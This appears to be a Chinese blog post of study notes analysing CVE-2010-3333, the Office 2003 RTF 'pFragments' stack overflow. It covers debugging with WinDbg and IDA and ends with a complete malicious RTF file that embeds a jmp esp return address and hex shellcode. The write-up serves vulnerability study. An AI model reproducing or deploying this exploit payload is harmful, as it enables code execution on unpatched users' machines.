{"title":"漏洞战争学习笔记 2：CVE-2010-3333","slug":"漏洞战争学习笔记2：CVE-2010-3333","date":"2020-07-31","updated":"2020-09-10","comments":true,"path":"api/posts/11816.json","excerpt":null,"cover":"https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png","covers":["https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png","https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png"],"content":"<h2 id=\"0x01- 分析环境\"><a href=\"#0x01- 分析环境\" class=\"headerlink\" title=\"0x01 分析环境\"></a>0x01 分析环境</h2><p>os: 由于笔者实在没有找到大佬们使用的目标文件 office word 2003 11.5604.5606, 只有 11.8169.8172，但是应该只要是 2003 sp3 的应该就问题不大。</p>\n<p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p>\n<h2 id=\"0x02- 漏洞描述\"><a href=\"#0x02- 漏洞描述\" class=\"headerlink\" title=\"0x02 漏洞描述\"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010 等多个版本的 office 软件中的 Open XML 文件格式转换器存在栈溢出漏洞，主要是在处理 RTF 的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的 RTF 数据执行任意代码，因此该漏洞又名”RTF 栈缓冲区溢出漏洞”。</p>\n<p>office word 2003 中的 MSO.dll 库在解析 RTF 文档的绘图 pFRagments 属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的 RTF 文件时就有可能导致执行任意代码。</p>\n<h2 id=\"0x03- 分析过程\"><a href=\"#0x03- 分析过程\" class=\"headerlink\" title=\"0x03 分析过程\"></a>0x03 分析过程 </h2><p> 用 Metasploit 生成测试样本 msf.rtf。</p>\n<p><img src=\"https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png\" alt=\"生成 msf.PNG\"></p>\n<p>运行 WinDbg 附加 Word 2003，但是每次都是还没有打开测试样本的时候，windbg 就已经报错了，我裂开了呀。然后看报错是 ntdll.dll 文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p>\n<p><img src=\"https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png\" alt=\"裂开.PNG\"></p>\n<p>[待续]</p>\n<p>打开测试样本，WinDbg 捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到 edi（0x130000）开始的不可写页面, 触发异常的指令位于 30e9eb88, 当前栈已被样本生成的垃圾数据覆盖。</p>\n<ul>\n<li>g</li>\n<li>kb</li>\n</ul>\n<p>在 30e9eb88 处下断，重新打开测试样本，断下来后通过 kb 指令得到的信息进行回溯，<br>结合 IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p>\n<p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的 4 在后面的计算中会变成 0，并且将 c8ac 除以 4（因为操作的大小为 DWORD</p>\n<ul>\n<li>p</li>\n</ul>\n<p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg 捕获异常，eip 已被改为 111111，至此我们可以确定该栈溢出漏洞可被利用</p>\n<h2 id=\"0x04- 漏洞利用\"><a href=\"#0x04- 漏洞利用\" class=\"headerlink\" title=\"0x04 漏洞利用\"></a>0x04 漏洞利用 </h2><h3 id=\"覆盖返回地址\"><a href=\"# 覆盖返回地址\" class=\"headerlink\" title=\"覆盖返回地址\"></a> 覆盖返回地址 </h3><p> 找到覆盖成返回地址的地方，修改成 0x7ffa4512（jmp esp），再在后面添加一些 0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中 30F4CB29 处是实现跳转的，而加了一些 0x90 后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p>\n<h3 id=\"布置 shellcode\"><a href=\"# 布置 shellcode\" class=\"headerlink\" title=\"布置 shellcode\"></a>布置 shellcode</h3><p>分析了下，是栈中多了一些 0x90 导致原来的一堆 00 不见了，所以需要在返回地址后面加 40 个 00，这样就可以执行到栈中了。在后面加入 shellcode，重新运行并成功进入 shellcode，<br>布置 shellcode 如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;\\rtf1&#123;&#125;&#123;\\shp&#123;\\*\\shpinst&#123;\\sp&#123;\\sn pfragments&#125;&#123;\\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>","url":"/posts/11816/","min2read":3,"word4post":861,"prev_post":{"title":"WinDbg 使用整理","url":"/posts/46552/"},"next_post":{"title":"SQL 学习与整理","url":"/posts/11594/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x01- 分析环境\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">0x01 分析环境</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x02- 漏洞描述\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">0x02 漏洞描述</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x03- 分析过程\" href = \"#\"><span class=\"toc-number\">3.</span> <span class=\"toc-text\">0x03 分析过程 </span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x04- 漏洞利用\" href = \"#\"><span class=\"toc-number\">4.</span> <span class=\"toc-text\">0x04 漏洞利用 </span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"覆盖返回地址\" href = \"#\"><span class=\"toc-number\">4.1.</span> <span class=\"toc-text\"> 覆盖返回地址 </span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"布置 shellcode\" href = \"#\"><span class=\"toc-number\">4.2.</span> <span class=\"toc-text\">布置 shellcode</span></a></li></ol></li></ol>","categories":[],"tags":[{"name":"漏洞战争","path":"api/tags/漏洞战争.json","url":"/tags/漏洞战争/"}]}